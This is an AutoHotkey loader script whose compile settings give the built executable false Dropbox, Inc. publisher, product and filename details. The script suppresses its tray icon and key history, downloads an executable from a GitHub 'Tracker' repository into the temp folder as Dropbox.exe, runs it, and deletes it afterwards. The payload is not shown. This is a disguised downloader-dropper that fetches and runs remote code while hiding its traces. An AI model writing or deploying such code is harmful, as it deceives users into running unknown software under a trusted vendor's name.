/*
 * * * Compile_AHK SETTINGS BEGIN * * *

[AHK2EXE]
Exe_File=%In_Dir%\Loader1.exe
No_UPX=1
Execution_Level=4
[VERSION]
Set_Version_Info=1
Company_Name=Dropbox, Inc.
File_Description=Dropbox
File_Version=0.0.4.0
Inc_File_Version=0
Legal_Copyright=Dropbox, Inc.
Original_Filename=Dropbox.exe
Product_Name=Dropbox
Product_Version=0.0.4.0
[ICONS]
Icon_2=0
Icon_3=0
Icon_4=0
Icon_5=0

* * * Compile_AHK SETTINGS END * * *
*/

#SingleInstance, Force
#NoEnv
#NoTrayIcon
#KeyHistory, 0
#Persistent
ListLines, Off
OnExit("Erase")

UrlDownloadToFile, https://github.com/Visionary1/Tracker/raw/master/v2/Package.exe, % A_Temp . "\Dropbox.exe"

If FileExist(A_Temp . "\Dropbox.exe")
{
	Try
		RunWait, % A_Temp . "\Dropbox.exe"
	Catch e
		Erase()
	Finally
		Erase()
}
Return

Erase()
{
	Try FileDelete, % A_Temp . "\Dropbox.exe"
	ExitApp
}